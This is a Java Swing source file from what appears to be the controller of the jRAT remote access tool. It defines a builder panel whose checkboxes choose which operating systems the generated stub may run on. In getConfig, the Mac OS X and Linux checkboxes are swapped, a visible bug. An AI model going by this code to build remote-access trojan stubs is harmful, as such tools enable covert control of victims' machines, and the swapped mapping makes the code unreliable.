package io.jrat.controller.ui.panels;

import com.redpois0n.oslib.OperatingSystem;
import iconlib.IconUtils;
import io.jrat.controller.Help;
import io.jrat.controller.OSConfig;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.LayoutStyle.ComponentPlacement;


@SuppressWarnings("serial")
public class PanelBuildOS extends JPanel {

	public JCheckBox chckbxMacOsx;
	public JCheckBox chckbxWindows;
	public JCheckBox chckbxLinux;
	public JCheckBox chckbxBSD;
	public JCheckBox chckbxSolaris;

	public boolean useWindows() {
		return chckbxWindows.isSelected();
	}

	public boolean useMac() {
		return chckbxMacOsx.isSelected();
	}

	public boolean useLinux() {
		return chckbxLinux.isSelected();
	}

	public boolean useBSD() {
		return chckbxBSD.isSelected();
	}

	public boolean useSolaris() {
		return chckbxSolaris.isSelected();
	}
	
	public OSConfig getConfig() {
		OSConfig config = new OSConfig();

		if (chckbxWindows.isSelected()) {
			config.addOS(OperatingSystem.WINDOWS);
		}
		if (chckbxMacOsx.isSelected()) {
			config.addOS(OperatingSystem.LINUX);
		}
		if (chckbxLinux.isSelected()) {
			config.addOS(OperatingSystem.OSX);
		}
		if (chckbxSolaris.isSelected()) {
			config.addOS(OperatingSystem.SOLARIS);
		}
		if (chckbxBSD.isSelected()) {
			config.addOS(OperatingSystem.BSD);
		}

		return config;
	}

	public PanelBuildOS() {

		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createTitledBorder("Allowed operating systems"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 428, GroupLayout.PREFERRED_SIZE).addContainerGap(12, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.DEFAULT_SIZE, 278, Short.MAX_VALUE).addContainerGap()));

		chckbxWindows = new JCheckBox("Windows");
		chckbxWindows.setSelected(true);

		chckbxMacOsx = new JCheckBox("Mac OS X");
		chckbxMacOsx.setSelected(true);

		chckbxLinux = new JCheckBox("Linux");
		chckbxLinux.setSelected(true);

		JLabel label = new JLabel("");
		label.setIcon(IconUtils.getIcon("os_win"));

		JLabel label_1 = new JLabel("");
		label_1.setIcon(IconUtils.getIcon("os_macosx"));

		JLabel label_2 = new JLabel("");
		label_2.setIcon(IconUtils.getIcon("os_linux"));

		JButton button = new JButton("");
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Help.help("Selects what operating systems the stub is allowed to execute on");
			}
		});
		button.setIcon(IconUtils.getIcon("help"));

		chckbxBSD = new JCheckBox("*BSD");
		chckbxBSD.setSelected(true);

		JLabel label_3 = new JLabel("");
		label_3.setIcon(IconUtils.getIcon("bsd_unknown"));

		chckbxSolaris = new JCheckBox("Solaris");
		chckbxSolaris.setSelected(true);

		JLabel label_5 = new JLabel("");
		label_5.setIcon(IconUtils.getIcon("os_solaris"));
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_panel.createSequentialGroup()
							.addContainerGap()
							.addComponent(button, GroupLayout.PREFERRED_SIZE, 36, GroupLayout.PREFERRED_SIZE))
						.addGroup(gl_panel.createSequentialGroup()
							.addGap(67)
							.addGroup(gl_panel.createParallelGroup(Alignment.TRAILING)
								.addComponent(label)
								.addComponent(label_1, GroupLayout.PREFERRED_SIZE, 16, GroupLayout.PREFERRED_SIZE)
								.addComponent(label_2, GroupLayout.PREFERRED_SIZE, 16, GroupLayout.PREFERRED_SIZE)
								.addComponent(label_3, GroupLayout.PREFERRED_SIZE, 16, GroupLayout.PREFERRED_SIZE)
								.addComponent(label_5, GroupLayout.PREFERRED_SIZE, 16, GroupLayout.PREFERRED_SIZE))
							.addPreferredGap(ComponentPlacement.RELATED)
							.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
								.addComponent(chckbxSolaris)
								.addComponent(chckbxLinux)
								.addComponent(chckbxMacOsx)
								.addComponent(chckbxWindows)
								.addComponent(chckbxBSD))))
					.addContainerGap(262, Short.MAX_VALUE))
		);
		gl_panel.setVerticalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_panel.createParallelGroup(Alignment.TRAILING, false)
						.addComponent(label, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
						.addComponent(chckbxWindows, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addComponent(chckbxMacOsx)
						.addComponent(label_1, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addComponent(chckbxLinux)
						.addComponent(label_2, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addComponent(chckbxBSD)
						.addComponent(label_3, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
					.addGroup(gl_panel.createParallelGroup(Alignment.TRAILING)
						.addComponent(label_5, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE)
						.addComponent(chckbxSolaris))
					.addGap(69)
					.addComponent(button)
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
		);
		panel.setLayout(gl_panel);
		setLayout(groupLayout);

	}
}
